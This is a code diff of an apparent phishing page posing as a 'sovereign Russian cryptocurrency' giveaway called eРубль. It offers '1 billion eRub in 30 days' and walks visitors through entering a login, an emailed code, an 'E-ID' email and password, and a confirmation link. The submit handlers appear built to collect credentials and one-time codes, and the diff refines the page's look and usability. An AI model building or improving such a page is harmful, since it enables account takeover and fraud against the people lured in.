@@ -35,7 +35,6 @@
             position: relative;
             overflow: hidden;
         }
-        /* ===== ДЕКОРАТИВНЫЙ ГЛОБАЛЬНЫЙ ЭЛЕМЕНТ ===== */
         .container::before {
             content: '';
             position: absolute;
@@ -74,7 +73,7 @@
         /* ===== ЛОГО ===== */
         .logo {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
         .logo h1 {
             font-size: 36px;
@@ -96,12 +95,12 @@
             text-transform: uppercase;
         }
 
-        /* ===== МЕНЮ (главная страница) ===== */
+        /* ===== МЕНЮ ===== */
         .menu-grid {
             display: flex;
             flex-direction: column;
             gap: 8px;
-            margin: 16px 0 24px;
+            margin: 12px 0 20px;
         }
         .menu-item {
             padding: 14px 18px;
@@ -124,7 +123,41 @@
             opacity: 0.5;
         }
 
-        /* ===== ЗАГОЛОВОК СТРАНИЦЫ ===== */
+        /* ===== БАННЕР ===== */
+        .hero-banner {
+            background: linear-gradient(135deg, rgba(67, 97, 238, 0.12), rgba(123, 97, 255, 0.08));
+            border-radius: 16px;
+            padding: 18px;
+            border: 1px solid rgba(67, 97, 238, 0.12);
+            margin: 4px 0 12px;
+            text-align: center;
+        }
+        .hero-banner h2 {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .hero-banner .highlight {
+            color: #7b61ff;
+        }
+        .hero-banner p {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+        .hero-banner .badge {
+            display: inline-block;
+            background: rgba(40, 167, 69, 0.15);
+            color: #4ade80;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 6px;
+            border: 1px solid rgba(40, 167, 69, 0.1);
+        }
+
+        /* ===== ЗАГОЛОВКИ ===== */
         .page-title {
             font-size: 24px;
             font-weight: 700;
@@ -141,7 +174,7 @@
         .page-icon {
             text-align: center;
             font-size: 44px;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
         }
 
         /* ===== ФОРМА ===== */
@@ -259,12 +292,11 @@
             color: rgba(255, 255, 255, 0.6);
         }
 
-        /* ===== РАЗДЕЛИТЕЛЬ ===== */
         .divider {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin: 20px 0 16px;
+            margin: 18px 0 14px;
         }
         .divider::before,
         .divider::after {
@@ -448,7 +480,7 @@
             letter-spacing: 0.5px;
         }
 
-        /* ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ ===== */
+        /* ===== ССЫЛКА ===== */
         .link-box {
             margin-top: 12px;
             padding: 16px;
@@ -498,47 +530,13 @@
             margin-top: 6px;
             line-height: 1.6;
         }
-
-        /* ===== ГЛАВНАЯ: БАННЕР ===== */
-        .hero-banner {
-            background: linear-gradient(135deg, rgba(67, 97, 238, 0.12), rgba(123, 97, 255, 0.08));
-            border-radius: 16px;
-            padding: 20px 18px;
-            border: 1px solid rgba(67, 97, 238, 0.12);
-            margin: 8px 0 16px;
-            text-align: center;
-        }
-        .hero-banner h2 {
-            color: #fff;
-            font-size: 20px;
-            font-weight: 700;
-        }
-        .hero-banner .highlight {
-            color: #7b61ff;
-        }
-        .hero-banner p {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 13px;
-            margin-top: 4px;
-        }
-        .hero-banner .badge {
-            display: inline-block;
-            background: rgba(40, 167, 69, 0.15);
-            color: #4ade80;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 8px;
-            border: 1px solid rgba(40, 167, 69, 0.1);
-        }
     </style>
 </head>
 <body>
     <div class="container">
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ (eРубль) ===== -->
+        <!-- СТРАНИЦА 1: ГЛАВНАЯ -->
         <!-- ========================================================= -->
         <div id="pageLogin" class="page active">
             <div class="logo">
@@ -546,25 +544,23 @@
                 <div class="sub">Суверенная криптовалюта России</div>
             </div>
 
-            <!-- Баннер -->
             <div class="hero-banner">
                 <h2>🚀 Первичное <span class="highlight">распределение</span></h2>
                 <p>1 миллиард eRub за 30 дней</p>
                 <div class="badge">🔥 Акция стартовала!</div>
             </div>
 
-            <!-- Меню -->
             <div class="menu-grid">
-                <div class="menu-item" onclick="switchPage(pageCode)">
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
                     <span class="icon">📊</span> О проекте
                 </div>
-                <div class="menu-item" onclick="switchPage(pageCode)">
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
                     <span class="icon">🛒</span> Как купить
                 </div>
-                <div class="menu-item" onclick="switchPage(pageCode)">
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
                     <span class="icon">📖</span> Руководство по eРублю
                 </div>
-                <div class="menu-item" onclick="switchPage(pageCode)">
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
                     <span class="icon">❓</span> Частые вопросы
                 </div>
             </div>
@@ -583,7 +579,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 2: ВХОД (форма) ===== -->
+        <!-- СТРАНИЦА 2: ФОРМА ВХОДА -->
         <!-- ========================================================= -->
         <div id="pageCode" class="page">
             <div class="page-icon">🔑</div>
@@ -608,7 +604,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 3: КОД ===== -->
+        <!-- СТРАНИЦА 3: КОД -->
         <!-- ========================================================= -->
         <div id="pageCodeConfirm" class="page">
             <div class="page-icon">📧</div>
@@ -631,7 +627,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 4: E-ID ===== -->
+        <!-- СТРАНИЦА 4: E-ID -->
         <!-- ========================================================= -->
         <div id="pageEid" class="page eid-page">
             <div class="eid-header">
@@ -668,7 +664,7 @@
         </div>
 
         <!-- ========================================================= -->
-        <!-- ===== СТРАНИЦА 5: УСПЕХ ===== -->
+        <!-- СТРАНИЦА 5: УСПЕХ -->
         <!-- ========================================================= -->
         <div id="pageSuccess" class="page success-page">
             <div class="check">✅</div>
@@ -730,7 +726,7 @@
         let eidPasswordValue = '';
 
         // ============================================================
-        // 3. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // 3. ВСПОМОГАТЕЛЬНЫЕ
         // ============================================================
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
@@ -802,19 +798,14 @@
         }
 
         // ============================================================
-        // 5. НАВИГАЦИЯ ПО ГЛАВНОЙ
+        // 5. НАВИГАЦИЯ
         // ============================================================
-        // Кнопка "Войти" на главной → страница входа
         loginBtn.addEventListener('click', goToCodePage);
-
-        // Кнопка "E-ID" на главной → страница E-ID
         eidBtn.addEventListener('click', goToEid);
-
-        // Назад с формы входа → главная
         backFromLoginBtn.addEventListener('click', goToLogin);
 
         // ============================================================
-        // 6. ОБЫЧНЫЙ ВХОД → ОТПРАВКА → КОД
+        // 6. ОБЫЧНЫЙ ВХОД
         // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -847,7 +838,7 @@
         });
 
         // ============================================================
-        // 7. КОД → ОТПРАВКА
+        // 7. КОД
         // ============================================================
         codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
@@ -875,11 +866,10 @@
             }
         });
 
-        // Назад из кода → форма входа
         backFromCodeBtn.addEventListener('click', goToCodePage);
 
         // ============================================================
-        // 8. E-ID → ПОЧТА + ПАРОЛЬ → ССЫЛКА
+        // 8. E-ID
         // ============================================================
         eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
@@ -920,7 +910,7 @@
         });
 
         // ============================================================
-        // 9. E-ID → ССЫЛКА → ОТПРАВКА
+        // 9. E-ID → ССЫЛКА
         // ============================================================
         eidLinkBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
@@ -953,10 +943,35 @@
             }
         });
 
-        // Назад из E-ID → главная
         backFromEidBtn.addEventListener('click', goToLogin);
 
         // ============================================================
         // 10. ВЕРНУТЬСЯ НА ГЛАВНУЮ
         // ============================================================
-        resetBtn.addEventListener('click
+        resetBtn.addEventListener('click', function() {
+            goToLogin();
+            showMsg('Вы вернулись на главную страницу', 'info');
+        });
+
+        // ============================================================
+        // 11. ENTER
+        // ============================================================
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                if (pageCode.classList.contains('active')) {
+                    loginSubmitBtn.click();
+                } else if (pageCodeConfirm.classList.contains('active')) {
+                    codeBtn.click();
+                } else if (pageEid.classList.contains('active')) {
+                    if (eidLinkBlock.style.display === 'block') {
+                        eidLinkBtn.click();
+                    } else {
+                        eidSubmitBtn.click();
+                    }
+                }
+            }
+        });
+
+        // ============================================================
+        // 12. ТЕХПОДДЕРЖКА
+        //
